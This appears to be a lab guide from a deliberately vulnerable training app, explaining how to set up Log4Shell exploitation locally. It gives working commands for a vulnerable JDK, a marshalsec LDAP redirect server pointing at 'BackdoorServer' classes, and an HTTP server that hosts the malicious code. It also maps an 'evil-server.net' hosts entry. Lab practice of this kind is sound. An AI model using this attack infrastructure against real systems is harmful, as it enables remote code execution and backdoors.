# Setting up exploitation of Log4Shell manually

**Prerequisites:**

* Python 3 or higher

**NOTE:** if you don't want the hassle of setting all of this up, you can use the very simple Docker setup, as described [here](log4shell_exploitation_setup_docker.md)!

For exploiting Log4Shell you'll need a few things:

* an instance of the Insecure Bank application, running on a vulnerable JVM version, e.g. `OpenJDK 1.8.0_181`
* an LDAP server providing a redirect to an HTTP server for loading the malicious Java code to be executed
* an HTTP server serving said malicious Java code
* built versions of the actual malicious Java code (exploits)
* (optional) a DNS entry pointing an "evil server" domain name to your LDAP server for more "realistic" payloads

## Vulnerable JVM version

Installing a vulnerable Java version, e.g. `OpenJDK 1.8.0_181`, can be done as explained in the next sections.

### Arch-based Linux

Download, install and configure `OpenJDK 1.8.0_181`:

```console
wget https://github.com/AdoptOpenJDK/openjdk8-binaries/releases/download/jdk8u181-b13/OpenJDK8U-jdk_x64_linux_hotspot_8u181b13.tar.gz
sudo tar xzf OpenJDK8U-jdk_x64_linux_hotspot_8u181b13.tar.gz -C /usr/lib/jvm
sudo archlinux-java set jdk8u181-b13
```

Check if version is set correctly:

```console
$ java -version && javac -version
openjdk version "1.8.0_181"
OpenJDK Runtime Environment (AdoptOpenJDK)(build 1.8.0_181-b13)
OpenJDK 64-Bit Server VM (AdoptOpenJDK)(build 25.181-b13, mixed mode)
javac 1.8.0_181
```

If needed, change Java version back and check again:

```console
$ sudo archlinux-java set java-11-openjdk
$ archlinux-java status
openjdk version "11.0.14" 2022-01-18
OpenJDK Runtime Environment (build 11.0.14+9-post-Debian-1deb11u1)
OpenJDK 64-Bit Server VM (build 11.0.14+9-post-Debian-1deb11u1, mixed mode, sharing)
javac 11.0.14
```

### Debian-based Linux

Download, install and configure `OpenJDK 1.8.0_181`:

```console
wget https://github.com/AdoptOpenJDK/openjdk8-binaries/releases/download/jdk8u181-b13/OpenJDK8U-jdk_x64_linux_hotspot_8u181b13.tar.gz
sudo mkdir /usr/lib/jvm
sudo tar xvf OpenJDK8U-jdk_x64_linux_hotspot_8u181b13.tar.gz -C /usr/lib/jvm
sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk8u181-b13/bin/java 1000
sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk8u181-b13/bin/javac 1000
sudo update-alternatives --set java /usr/lib/jvm/jdk8u181-b13/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk8u181-b13/bin/javac
```

Check if version is set correctly:

```console
$ java -version && javac -version
openjdk version "1.8.0_181"
OpenJDK Runtime Environment (AdoptOpenJDK)(build 1.8.0_181-b13)
OpenJDK 64-Bit Server VM (AdoptOpenJDK)(build 25.181-b13, mixed mode)
javac 1.8.0_181
```

If needed, change Java version back and check again:

```console
$ sudo update-alternatives --set java /usr/lib/jvm/java-11-openjdk-amd64/bin/java
$ sudo update-alternatives --set javac /usr/lib/jvm/java-11-openjdk-amd64/bin/javac
$ java -version && javac -version
openjdk version "11.0.14" 2022-01-18
OpenJDK Runtime Environment (build 11.0.14+9-post-Debian-1deb11u1)
OpenJDK 64-Bit Server VM (build 11.0.14+9-post-Debian-1deb11u1, mixed mode, sharing)
javac 11.0.14
```

## LDAP server

As LDAP server we'll use `marshalsec` here (<https://github.com/mbechler/marshalsec>), which is located in the `marshalsec` folder already.

Build `marshalsec`:

```console
cd marshalsec
mvn clean package
```

Running `marshalsec` works as follows:

```console
cd marshalsec
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<http_host>:<http_port>/#<malicious_java_class>" <ldap_port>
```

requiring this information:

* `<http_host>:<http_port>`: host and port where HTTP server providing malicious Java code is running (e.g. `localhost:9876`)
* `<malicious_java_class>`: class name of malicious Java class that should be loaded from HTTP server (e.g. `BackdoorServer`)
* `<ldap_port>`: port on which this LDAP server listening, which is relevant for exploit payload used in attack (e.g. `1389`)

Serving the exploits in this repository via LDAP server instances can be achieved as follows (in seperate terminals):

```console
cd marshalsec
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9876/#BackdoorServer" 1389
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9876/#BackdoorServerV2" 1390
```

## HTTP server

As HTTP server we'll use the simple python3-internal HTTP server, which can be run as follows (serving files in `exploits` directory on port `9876`):

```console
cd exploits
python3 -m http.server --bind 0.0.0.0 9876
```

## Built Log4Shell exploits

Building the exploits:

```console
cd exploits
javac -cp javax.servlet-api-3.1.0.jar *.java
```

## Evil server DNS entry pointing towards LDAP server

If you want real "evil server domain names" for suggesting attacker controlled remotely located servers, you can adapt your `/etc/hosts` file as follows (on the machine which runs Insecure Bank):

```console
sudo nano /etc/hosts
ADD
        127.0.0.1       evil-server.net
```

**Pro-tip:** you can use the exact same approach for using any arbitrary domain name to point to your (e.g. local) installation of Insecure Bank, as follows:

```console
sudo nano /etc/hosts
ADD
        127.0.0.1       insecure-bank.com
```
